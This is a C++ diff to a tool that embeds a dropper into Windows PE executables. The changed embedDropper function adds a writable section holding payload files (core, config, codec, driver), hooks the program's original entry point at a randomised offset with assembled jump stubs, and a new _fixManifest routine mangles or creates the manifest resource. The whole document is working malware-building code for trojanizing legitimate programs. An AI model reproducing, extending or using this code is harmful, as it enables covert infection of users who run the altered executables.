@@ -16,6 +16,7 @@ using namespace std;
 #include "DropperObject.h"
 #include "Exceptions.h"
 #include "FileBuffer.h"
+#include "Manifest.h"
 #include "PEObject.h"
 #include "ResourceDataEntry.h"
 #include "ResourceDirectory.h"
@@ -595,7 +596,7 @@ bool PEObject::_updateResource( WCHAR* type, WCHAR* name, LANGID lang, PBYTE dat
 	return true;
 }
 
-std::size_t PEObject::writeResources( char* data, DWORD virtualAddress )
+std::size_t PEObject::_writeResources( char* data, DWORD virtualAddress )
 {
 	DWORD level = 0;
 	
@@ -1061,10 +1062,20 @@ bool PEObject::_parseText()
 
 #define OFFSET(x, y) (((DWORD)x) - ((DWORD)y))
 
-bool PEObject::embedDropper( bf::path core, bf::path config, bf::path codec, bf::path driver, std::string installDir )
+bool PEObject::embedDropper( bf::path core, bf::path config, bf::path codec, bf::path driver, std::string installDir, bool fixManifest )
 {
-	GenericSection* epSection = findSection(ntHeaders()->OptionalHeader.AddressOfEntryPoint);
-	DWORD displacement = rand() % (ntHeaders()->OptionalHeader.AddressOfEntryPoint - epSection->VirtualAddress() - 5);
+	DWORD OEP = ntHeaders()->OptionalHeader.AddressOfEntryPoint;
+	GenericSection* epSection = findSection(OEP);
+	
+	srand( time(NULL) );
+	DWORD displacement = 0;
+	do
+	{
+		DWORD range = OEP - epSection->VirtualAddress() - 5;
+		DWORD random = rand();
+		displacement = random % range;
+	} while ( epSection->VirtualAddress() + displacement > epSection->VirtualAddress() + epSection->SizeOfRawData() );
+	
 	_hookPointer.stage2.ptr = epSection->data() + displacement;
 	_hookPointer.stage2.va = ntHeaders()->OptionalHeader.ImageBase + epSection->VirtualAddress() + displacement;
 	
@@ -1084,6 +1095,8 @@ bool PEObject::embedDropper( bf::path core, bf::path config, bf::path codec, bf:
 	
 	// base size is original resource section
 	std::size_t sectionSize = alignTo(alignToDWORD(targetSection->SizeOfRawData()) + alignToDWORD(dropper.size()), fileAlignment());
+	if (fixManifest)
+		sectionSize += _sizeOfResources();
 	
 	char* sectionData = NULL;
 	try {
@@ -1129,8 +1142,23 @@ bool PEObject::embedDropper( bf::path core, bf::path config, bf::path codec, bf:
 	restoreStub.relocCode( ptr + dropper.restoreStubOffset() );
 	
 	ptr += alignToDWORD(dropper.size());
-	sectionSize = ptr - sectionData;
 	
+	// write resources
+	if (fixManifest) {
+		try {
+			_fixManifest();
+		} catch (...) {
+			throw std::exception("Cannot fix manifest");
+		}
+		DWORD VA = targetSection->VirtualAddress() + ( (DWORD)ptr - (DWORD)sectionData );
+		std::size_t size = _writeResources( ptr, VA );
+		dataDirectory(IMAGE_DIRECTORY_ENTRY_RESOURCE)->VirtualAddress = VA;
+		dataDirectory(IMAGE_DIRECTORY_ENTRY_RESOURCE)->Size = size;
+		ptr += size;
+	}
+	
+	// calculate total section size
+	sectionSize = ptr - sectionData;
 	cout << "Dropper size " << dec << dropper.size() << endl;
 	
 	// write to section
@@ -1140,8 +1168,10 @@ bool PEObject::embedDropper( bf::path core, bf::path config, bf::path codec, bf:
 	} catch (...) {
 		throw std::exception("Cannot allocate memory for new section.");
 	}
+	// fix section permissions
 	targetSection->SetCharacteristics(targetSection->Characteristics() | IMAGE_SCN_MEM_WRITE);
 	
+	// patch stubs code
 	AsmJit::Assembler stage1stub;
 	stage1stub.jmp( ((DWORD)_hookPointer.stage1.ptr) + (_hookPointer.stage2.va - _hookPointer.stage1.va) );
 	stage1stub.relocCode( (void*) _hookPointer.stage1.ptr );
@@ -1151,4 +1181,68 @@ bool PEObject::embedDropper( bf::path core, bf::path config, bf::path codec, bf:
 	stage2stub.relocCode( (void*) _hookPointer.stage2.ptr );
 	
 	return true;
+}
+
+bool PEObject::_fixManifest()
+{
+	if (!_resources.dir)
+		return false;
+	
+	// *** Get MANIFEST
+	WCHAR* resType = MAKEINTRESOURCEW(24);
+	int typeIdx = _resources.dir->Find(resType);
+	if (typeIdx == -1) 
+	{
+		// we don't have a manifest entry, add everything
+		Manifest* manifest = new Manifest();
+		manifest->create();
+		cout << endl << "MANGLED: " << endl << endl << manifest->toString() << endl;
+		_updateResource(
+			resType,
+			(WORD)1, 
+			(LANGID)0, 
+			(PBYTE)manifest->toCharPtr(), 
+			manifest->size());
+
+		return true;
+	}
+	else
+	{
+		ResourceDirectory* nameDir = _resources.dir->GetEntry(typeIdx)->GetSubDirectory();
+		int nameIdx = nameDir->Find(1);
+		if (nameIdx <= -1)
+			return false;
+		
+		ResourceDirectory* langDir = nameDir->GetEntry(nameIdx)->GetSubDirectory();
+		int langIdx = langDir->Find((WORD)0);
+		if (langDir->CountEntries() <= 0)
+			return false;
+		
+		// get first entry, we do not care of language for manifest
+		ResourceDataEntry* dataEntry = langDir->GetEntry(0)->GetDataEntry();
+		if (!dataEntry)
+			return false;
+		
+		PCHAR originalManifest = new CHAR[dataEntry->GetSize() + 1];
+		memset(originalManifest, 0, dataEntry->GetSize() + 1);
+		memcpy(originalManifest, dataEntry->GetData(), dataEntry->GetSize());
+		
+		cout << endl << "MANIFEST: " << endl << endl << originalManifest << endl;
+		
+		// MANIFEST MANGLING
+		Manifest* manifest = new Manifest(string(originalManifest));
+		manifest->check();
+		manifest->serialize();
+		
+		cout << endl << "MANGLED: " << endl << endl << manifest->toString() << endl;
+		
+		dataEntry->SetAdded(true);
+		dataEntry->SetData((PBYTE)manifest->toCharPtr(), manifest->size(), dataEntry->GetCodePage());
+		
+		delete [] originalManifest;
+
+		return true;
+	}
+
+	return false;
 }
